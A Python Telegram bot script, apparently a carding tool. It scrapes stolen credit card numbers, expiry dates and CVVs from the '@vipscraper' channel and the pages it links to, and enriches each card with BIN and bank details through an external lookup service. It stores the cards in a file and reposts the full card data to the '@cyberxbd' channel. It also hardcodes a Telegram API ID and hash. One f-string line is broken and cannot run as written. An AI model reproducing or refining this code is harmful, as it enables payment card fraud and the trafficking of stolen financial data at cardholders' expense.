import telethon
import asyncio
import os, sys
import re
import requests
from telethon import TelegramClient, events
from random_address import real_random_address
import names
from datetime import datetime
import random


from defs import getUrl, getcards, phone
API_ID =  11366999
API_HASH = '9f861477804a413b9c0223d85382b609'
SEND_CHAT = '@cyberxbd'

client = TelegramClient('session', API_ID, API_HASH)
ccs = []

chats  = [
    '@vipscraper'  
]

with open('cards.txt', 'r') as r:
    temp_cards = r.read().splitlines()


for x in temp_cards:
    car = getcards(x)
    if car:
        ccs.append(car[0])
    else:
        continue

@client.on(events.NewMessage(chats=chats, func = lambda x: getattr(x, 'text')))
async def my_event_handler(m):
    if m.reply_markup:
        text = m.reply_markup.stringify()
        urls = getUrl(text)
        if not urls:
            return
        text = requests.get(urls[0]).text
    else:
        text = m.text
    cards = getcards(text)
    if not cards:
        return
    cc,mes,ano,cvv = cards
    if cc in ccs:
        return
    ccs.append(cc)
    bin = requests.get(f'https://adyen-enc-and-bin-info.herokuapp.com/bin/{cc[:6]}')
    if not bin:
        return
    bin_json =  bin.json()
    fullinfo = f"{cc}|{mes}|{ano}|{cvv}
    text = f"""

CC: {cc}|{mes}|{ano}|{cvv}
INFO: {bin_json['vendor']} - {bin_json['type']} - {bin_json['level']}
BANK: {bin_json['bank']}
COUNTRY: {bin_json['country_iso']} - {bin_json['flag']}

"""    
    print(f'{cc}|{mes}|{ano}|{cvv}')
    with open('cards.txt', 'a') as w:
        w.write(fullinfo + '\n')
    await client.send_message(SEND_CHAT, text, link_preview = False)


@client.on(events.NewMessage(outgoing = True, pattern = re.compile(r'.lives')))
async def my_event_handler(m):
    # emt = await client.get_entity(1582775844)
    # print(telethon.utils.get_input_channel(emt))
    # print(telethon.utils.resolve_id(emt))
    await m.reply(file = 'cards.txt')



client.start()
client.run_until_disconnected()